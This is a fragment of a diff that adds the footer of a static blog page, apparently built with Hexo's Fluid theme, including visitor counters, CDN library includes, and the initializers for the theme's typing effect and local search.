+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
